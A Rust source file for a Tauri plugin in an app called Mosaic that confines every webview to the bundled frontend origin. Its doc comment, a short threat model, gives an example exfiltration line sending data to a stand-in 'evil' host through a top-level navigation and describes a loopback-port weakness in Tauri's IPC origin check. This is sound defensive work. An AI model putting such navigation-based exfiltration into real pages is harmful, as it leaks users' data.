//! Keeps every webview on Mosaic's own pages.
//!
//! The CSP stops fetches, images, frames and form posts to other origins,
//! but not a top-level navigation. Without this guard, a script or a link in
//! the webview could:
//!
//! - send data out through the address (`location = "https://evil/?" + x`);
//! - show a remote page inside Mosaic's window, where it can ask for the
//!   master password;
//! - open `http://tauri.localhost:<port>/`, a page that any local process can
//!   serve. Tauri's IPC check counts that page as local, because it compares
//!   only the scheme and the host, not the port;
//! - hand `file:`, `ms-settings:` and other custom schemes to the OS.
//!
//! `window.open` is refused already: Mosaic sets no new-window handler, and
//! wry then refuses every popup. Dropped files and URLs go to Tauri's
//! drag-and-drop handler (`dragDropEnabled`, on by default), not to a
//! navigation; this guard catches them as well if that setting is turned
//! off.

use tauri::plugin::{Builder, TauriPlugin};
use tauri::{Manager as _, Runtime, Url};

/// The plugin's name. It has no commands, so no permission names it.
pub const PLUGIN: &str = "mosaic-navigation";

/// The app's own origin: wry serves the bundled frontend at
/// `http://tauri.localhost` on Windows (`useHttpsScheme` is off) and at
/// `tauri://localhost` elsewhere. The port must be absent; a port means
/// another server on the loopback interface.
fn is_bundled(url: &Url) -> bool {
    let expected = if cfg!(windows) {
        ("http", "tauri.localhost")
    } else {
        ("tauri", "localhost")
    };
    url.scheme() == expected.0 && url.host_str() == Some(expected.1) && url.port().is_none()
}

/// Whether a webview may load `url`. `dev_url` is the Vite dev server from
/// `tauri.conf.json`; it counts only in builds without the
/// `custom-protocol` feature (`tauri dev`). A release build loads nothing
/// but the bundled frontend.
#[must_use]
pub fn is_app_url(url: &Url, dev_url: Option<&Url>) -> bool {
    if !url.username().is_empty() || url.password().is_some() {
        return false;
    }
    let dev = !cfg!(feature = "custom-protocol")
        && dev_url.is_some_and(|dev| {
            matches!(dev.scheme(), "http" | "https") && dev.origin() == url.origin()
        });
    is_bundled(url) || dev
}

/// The guard, registered on the app builder so it covers every webview.
#[must_use]
pub fn guard<R: Runtime>() -> TauriPlugin<R> {
    Builder::new(PLUGIN)
        .on_navigation(|webview, url| is_app_url(url, webview.config().build.dev_url.as_ref()))
        .build()
}
